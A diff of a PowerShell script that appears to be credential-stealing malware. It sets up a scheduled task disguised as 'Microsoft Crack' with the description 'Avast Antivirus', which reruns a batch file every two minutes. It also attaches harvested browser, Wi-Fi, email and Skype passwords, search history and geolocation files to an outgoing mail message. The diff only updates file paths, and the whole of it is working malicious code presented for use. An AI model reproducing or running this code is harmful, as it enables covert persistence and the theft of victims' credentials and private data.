@@ -1,4 +1,4 @@
-﻿Start-Sleep -Milliseconds 60
+Start-Sleep -Milliseconds 60
 $location = ($pwd).path
 
 Add-Type -AssemblyName System.Device 
@@ -31,11 +31,11 @@ if(!(Test-Path "$location\Microsoft\count.txt")) {
 
 
      try { 
-	  schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "Microsoft Crack" /TR "C:\Users\Public\Licence\Microsoft.bat" /ST 00:00 /RI 2 /DU 24:00 | Out-Null
+	  schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "Microsoft Crack" /TR "C:\Users\Public\Licence\Licence-main\Microsoft.bat" /ST 00:00 /RI 2 /DU 24:00 | Out-Null
      }
      catch { 
 	    $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("2")) -RepeatIndefinitely
-            $action = New-ScheduledTaskAction -Execute "C:\Users\Public\Licence\Microsoft.bat"
+            $action = New-ScheduledTaskAction -Execute "C:\Users\Public\Licence\Licence-main\Microsoft.bat"
             Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Microsoft Crack" -Description "Avast Antivirus" -Force		
 	   }
   	
@@ -102,20 +102,20 @@ else{
         
 
 	Start-Sleep -Milliseconds 10
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Browser\BrowserDownloadsView.txt")
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Browser\MyLastSearch.txt")
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Browser\WebBrowserPassView.txt")
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Chrome\ChromePass.txt")
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Firefox\FirefoxDownloadsView.txt")
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Firefox\PasswordFox.txt")
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\IExplorer\iepv.txt")
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Location\GeoLocation.txt")
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Opera\OperaPassView.txt")
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Social\mailpv.txt")
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Social\SkypeLogView.txt")
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Task\TaskSchedulerView.txt")
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt")
-	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\IPnHost.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Browser\BrowserDownloadsView.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Browser\MyLastSearch.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Browser\WebBrowserPassView.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Chrome\ChromePass.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Firefox\FirefoxDownloadsView.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Firefox\PasswordFox.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\IExplorer\iepv.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Location\GeoLocation.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Opera\OperaPassView.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Social\mailpv.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Social\SkypeLogView.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Task\TaskSchedulerView.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\WiFi\WirelessPass.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\IPnHost.txt")
 	   
        
        
